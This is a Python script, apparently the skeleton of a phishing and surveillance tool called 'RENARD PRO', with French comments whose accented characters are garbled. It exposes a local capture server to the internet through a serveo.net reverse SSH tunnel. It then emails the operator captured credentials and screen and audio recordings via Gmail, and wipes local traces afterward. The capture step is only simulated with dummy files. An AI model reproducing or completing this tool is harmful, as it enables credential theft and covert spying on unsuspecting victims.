import os
import sys
import time
import smtplib
import socket
import subprocess
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pydub import AudioSegment
import logging
from cryptography.fernet import Fernet

# Configuration
CONFIG = {
    'TEMP_DIR': "secure_captures",
    'SERVER_TIMEOUT': 30,
    'AUDIO_DURATION': 12,
    'SCREEN_DURATION': 12,
    'SELFIE_COUNT': 8,
    'MAX_FILE_SIZE': 10 * 1024 * 1024  # 10MB
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('surveillance.log'),
        logging.StreamHandler()
    ]
)

class SecureSurveillance:
    def __init__(self):
        os.makedirs(CONFIG['TEMP_DIR'], exist_ok=True)
        self.files_to_send = []
        self.user_email = ""
        self.app_password = ""
        self.cipher = Fernet(Fernet.generate_key())  # Chiffrement des fichiers

    def show_banner(self):
        """Votre banni√®re ASCII am√©lior√©e"""
        banner = r"""
‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïù‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ïö‚ñà‚ñà‚ñà‚ïî‚ïù    ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù   ‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù
-------------------------------------------------------
   ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
   ‚ïë       [‚úì] TOOL NAME : RENARD PRO             ‚ïë
   ‚ïë                                               ‚ïë
   ‚ïë       [‚úì] VERSION : 2.3.1                    ‚ïë
   ‚ïë       [‚úì] SECURITY : AES-256 + TLS           ‚ïë
   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
"""
        print(f"\033[1;32m{banner}\033[0m")

    def secure_tunnel(self):
        """Tunnel SSH s√©curis√© avec v√©rification"""
        try:
            logging.info("Establishing secure tunnel...")
            
            # V√©rification des d√©pendances
            if not self._check_ssh_available():
                raise Exception("OpenSSH non install√©")
            
            # Commandes de tunnel avec v√©rification
            cmd = [
                "ssh", "-o", "StrictHostKeyChecking=yes",
                "-o", "PasswordAuthentication=no",
                "-R", "80:localhost:5000", "serveo.net"
            ]
            
            tunnel = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Attente intelligente du tunnel
            url = None
            for line in iter(tunnel.stderr.readline, ''):
                if "Forwarding" in line:
                    url = line.strip().split()[-1]
                    logging.info(f"Tunnel √©tabli: {url}")
                    break
            
            if not url:
                raise Exception("√âchec de cr√©ation du tunnel")
                
            return url
            
        except Exception as e:
            logging.error(f"Erreur tunnel: {str(e)}")
            self.cleanup()
            return None

    def encrypt_file(self, filepath):
        """Chiffrement AES des fichiers"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            encrypted_path = f"{filepath}.enc"
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted)
                
            return encrypted_path
        except Exception as e:
            logging.error(f"Erreur chiffrement: {str(e)}")
            return None

    def secure_email(self, credentials):
        """Envoi s√©curis√© avec v√©rification"""
        try:
            # V√©rification pr√©alable
            if not all([self.user_email, self.app_password]):
                raise Exception("Identifiants manquants")
            
            # Pr√©paration du message
            msg = MIMEMultipart()
            msg['From'] = self.user_email
            msg['To'] = self.user_email
            msg['Subject'] = 'üîí RENARD - Rapport S√©curis√©'
            
            # Corps chiffr√©
            body = f"""
            ‚ö†Ô∏è NE PAS PARTAGER ‚ö†Ô∏è
            Timestamp: {time.ctime()}
            Identifiants captur√©s: {credentials}
            Fichiers joints: {len(self.files_to_send)}
            """
            msg.attach(MIMEText(body, 'plain'))
            
            # Pi√®ces jointes chiffr√©es
            for file in self.files_to_send:
                if os.path.exists(file):
                    encrypted_file = self.encrypt_file(file)
                    if encrypted_file:
                        with open(encrypted_file, 'rb') as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename="{os.path.basename(encrypted_file)}"'
                        )
                        msg.attach(part)
            
            # Connexion SMTP s√©curis√©e
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30) as server:
                server.login(self.user_email, self.app_password)
                server.send_message(msg)
            
            logging.info("Email s√©curis√© envoy√© avec succ√®s")
            return True
            
        except Exception as e:
            logging.error(f"Erreur envoi s√©curis√©: {str(e)}")
            return False

    def run(self):
        try:
            self.show_banner()
            
            # Saisie s√©curis√©e
            self.user_email = input("\033[35m[SECURE] Email Gmail: \033[0m").strip()
            self.app_password = input("\033[35m[SECURE] Mot de passe d'application: \033[0m").strip()
            
            # V√©rification des entr√©es
            if not all([self.user_email.endswith('@gmail.com'), len(self.app_password) >= 16]):
                raise Exception("Authentification invalide")
            
            # Tunnel s√©curis√©
            url = self.secure_tunnel()
            if not url:
                return
                
            print(f"\033[36m[SECURITY] URL de capture: {url}\033[0m")
            logging.info("En attente des donn√©es client...")
            
            # Simulation des captures (remplacer par le vrai code)
            self._simulate_captures()
            
            # Envoi final
            if self.secure_email({"user": "test", "pass": "1234"}):
                print("\033[32m[SUCCESS] V√©rifiez votre bo√Æte mail s√©curis√©e!\033[0m")
            else:
                print("\033[31m[ERROR] √âchec de l'envoi s√©curis√©\033[0m")
                
        except KeyboardInterrupt:
            logging.info("Interruption utilisateur")
        except Exception as e:
            logging.error(f"Erreur syst√®me: {str(e)}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Nettoyage s√©curis√©"""
        try:
            # Suppression s√©curis√©e des fichiers
            for root, _, files in os.walk(CONFIG['TEMP_DIR']):
                for file in files:
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'wb') as f:
                            f.write(os.urandom(os.path.getsize(path)))
                        os.unlink(path)
                    except:
                        pass
                        
            logging.info("Nettoyage s√©curis√© effectu√©")
        except:
            pass

    def _check_ssh_available(self):
        """V√©rifie la disponibilit√© de SSH"""
        try:
            subprocess.run(["ssh", "-V"], check=True, capture_output=True)
            return True
        except:
            return False

    def _simulate_captures(self):
        """Simule les captures pour le test"""
        logging.info("Simulation des captures...")
        time.sleep(2)
        self.files_to_send = [
            os.path.join(CONFIG['TEMP_DIR'], "screen.webm"),
            os.path.join(CONFIG['TEMP_DIR'], "audio.wav")
        ]
        for f in self.files_to_send:
            with open(f, 'wb') as tmp:
                tmp.write(os.urandom(1024))  # Fichier factice

if __name__ == "__main__":
    # V√©rification des d√©pendances
    try:
        from cryptography.fernet import Fernet
    except ImportError:
        print("\033[31mInstallez cryptography: pip install cryptography\033[0m")
        sys.exit(1)
        
    # Ex√©cution
    app = SecureSurveillance()
    app.run()
